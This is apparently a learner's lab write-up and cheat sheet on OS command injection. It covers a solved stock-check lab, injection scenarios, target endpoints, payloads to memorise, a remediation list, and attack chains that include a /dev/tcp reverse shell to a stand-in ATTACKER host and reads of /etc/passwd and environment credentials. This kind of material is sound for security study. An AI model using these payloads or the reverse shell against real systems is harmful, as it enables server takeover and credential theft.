# 🧨 OS Command Injection (Shell Injection)

---

## 🔹 Overview

OS Command Injection is a *critical server-side vulnerability* where an application executes operating system commands using *user-controlled input* without proper sanitization.

A successful exploit allows an attacker to:

- Run arbitrary system commands
- Read sensitive files
- Take full control of the server
- Pivot to internal systems

---

## 🔹 What Is This Topic?

> OS Command Injection occurs when user input is directly inserted into a system command (bash, sh, cmd, PowerShell) and executed by the OS.

This usually happens when developers:

- Use system(), exec(), shell_exec()
- Call shell scripts or OS binaries
- Trust user input for system-level operations

---

## 🔹 Lab Walkthrough (Your Solved Lab)

*Step-by-Step Exploitation*

### 1️⃣ Identify parameter passed to OS command

/stockStatus?productID=2&storeID=1

### 2️⃣ Test command injection separator

| whoami

### 3️⃣ Final payload
```
productID=2&storeID=1|whoami
```

### 4️⃣ Observe response

- Username printed in response


### 5️⃣ Submit username

- Lab solved ✅

---

## 🔹 Evidence

![command injection OS name](../images/osci-whoami.png)

---

## 🔹 Real-World Scenarios (OUT OF THE BOX)

### 1️⃣ Network Diagnostic Features (Most Common)

*Scenario*  
A website allows users to test connectivity.

*Example Endpoint*

/ping?host=8.8.8.8

*Backend Logic*

ping -c 3 <user_input>

*Attacker Input*

8.8.8.8 | whoami

*Impact*
- Command execution
- Server user disclosure
- Easy RCE

---

### 2️⃣ Stock / Inventory Systems (Your Lab)

*Scenario*  
Legacy system checks product availability.

*Backend*

stockreport.pl productID storeID

*Attacker Input*

productID=2&storeID=1|whoami

*Impact*
- Arbitrary command execution
- Data exfiltration
- Full backend compromise

---

### 3️⃣ File Management Systems

*Scenario*  
Admin panel reads logs or exports files.

*Endpoint*

/download?file=report.txt

*Attacker Input*

report.txt; id

*Impact*
- File system access
- User enumeration
- Data leakage

---

### 4️⃣ Image / Media Processing

*Scenario*  
Server resizes or converts images.

*Backend*

convert <filename> -resize 200x200

*Attacker Input*

image.jpg; whoami

*Impact*
- RCE via image tools (ImageMagick, etc.)
- Very common in bug bounties

---

### 5️⃣ Backup / Maintenance Endpoints (HIGH RISK)

*Scenario*  
Admin triggers backups or cleanup tasks.

*Endpoints*

/backup /cleanup /run-task

*Attacker Input*

backup && whoami

*Impact*
- 🚨 Full server takeover
- 🚨 Often runs as root

---

### 6️⃣ URL Fetch / Import Features

*Scenario*  
Application fetches data from user-provided URL.

*Endpoint*

/fetch?url=http://example.com

*Attacker Input*

http://test.com | whoami

*Impact*
- RCE
- SSRF + OSCI combo

---

### 7️⃣ API Endpoints (JSON / XML)

*Scenario*  
Backend processes system tasks via API.

*Payload*
```json
{
  "host": "8.8.8.8; whoami"
}
```
*Impact*
- Silent RCE
- Often overlooked by developers

---

## 🔹 High-Value Endpoints to Always Test

*🔥 Priority Targets*
```
/ping
/network-test
/status
/diagnostics
/backup
/restore
/cleanup
/convert
/resize
/export
/import
/fetch
/api/*
/admin/*
```

---

## 🔹 Universal Payloads (MEMORIZE)

*Linux / Unix*
```
; whoami
&& whoami
| whoami
$(whoami)
whoami
; sleep 5
```

*Windows*
```
& whoami
| whoami
&& whoami
```

---

## 🔹 Multi-Chain Attacks (REAL WORLD)

### 🔗 Chain 1: OSCI → File Read → Secrets

- OSCI → cat /etc/passwd

### 🔗 Chain 2: OSCI → Reverse Shell

- OSCI → bash -i >& /dev/tcp/ATTACKER/4444

### 🔗 Chain 3: OSCI → Credential Dump → Lateral Movement

- OSCI → env → DB creds → DB takeover

### 🔗 Chain 4: OSCI + SSRF

- URL fetch + shell execution → Internal network scan


---

3# 🔹 Impact (Why This Is CRITICAL)

- Full server compromise
- Database theft
- Credential leakage
- Lateral movement
- Supply-chain compromise
- Complete infrastructure takeover
- CVSS: Usually 9.8 – 10.0


---

## 🔹 Remediation (Defender View)

✅ Never pass user input to shell
✅ Use safe APIs instead of OS commands
✅ Whitelist input values
✅ Escape shell metacharacters
✅ Use parameterized commands
✅ Run services with least privilege
✅ Disable shell execution if not required

---

## 🔹 Extra Notes / Pro Tips

- Timing payload (sleep 5) = blind injection
- Output visible = easiest confirmation
- Always test |, ;, &&
- APIs are more vulnerable than UI
- Legacy code = high risk
- Admin tools = jackpot

